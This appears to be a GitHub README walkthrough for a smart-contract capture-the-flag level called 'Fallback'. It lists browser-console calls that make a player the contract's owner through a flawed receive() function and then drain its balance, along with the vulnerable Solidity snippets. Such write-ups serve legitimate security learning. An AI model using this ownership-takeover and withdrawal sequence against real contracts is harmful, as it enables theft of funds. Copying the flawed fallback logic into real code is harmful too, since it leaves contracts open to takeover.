# Level 1 - Fallback challenge 🚧 Work In Progress 🏗
<p align="left"> <img src="https://komarev.com/ghpvc/?username=Level1&label=Repository%20views&color=0e75b6&style=flat" alt="wrappedusername" /> </p>

## Player will use browser console for this attack.
```JavaScript
await contract.contribute({value: 1});
await contract.sendTransaction({value: 1 });
await contract.owner();
await contract.withdraw();
```
In order to pass the require statement player must use function contribute() 1 wei will be enough, using the console
player calls await contract.contribute({value: 1}).
```JavaScript
await contract.contribute({value: 1});
```
Next player calls await contract.sendTransaction({value: 1}) to the fallback function receive().
```JavaScript
await contract.sendTransaction({value: 1 });
```
Player can verify ownership with await contract.owner().
```JavaScript
await contract.owner();
```
Player will now be able to withdraw all tokens using await contract.withdraw().
```JavaScript
await contract.withdraw();
```
## Code snippets from contract showing vulnerablities.
```Solidity
 /** 
 @notice This fallback function receive() is the main attack target, in order to pass the 
  require statement player must use function contribute() 1 wei will be enough, using the console
  player calls await contract.contribute({value: 1}), then player calls await contract.sendTransaction({value: 1}),
  player can verify ownership with await contract.owner(), player will now be able to withdraw all tokens. 
  */
  receive() external payable {
    require(msg.value > 0 && contributions[msg.sender] > 0);
    owner = msg.sender; 
  }
  
  /** 
  @notice This function could use a withdraw limit, but this allows player to exploit the 
  vulnerability to withdraw all funds using await contract.withdraw() to complete this level. 
  */
  function withdraw() public onlyOwner {
    owner.transfer(address(this).balance);
  }
  ```
  
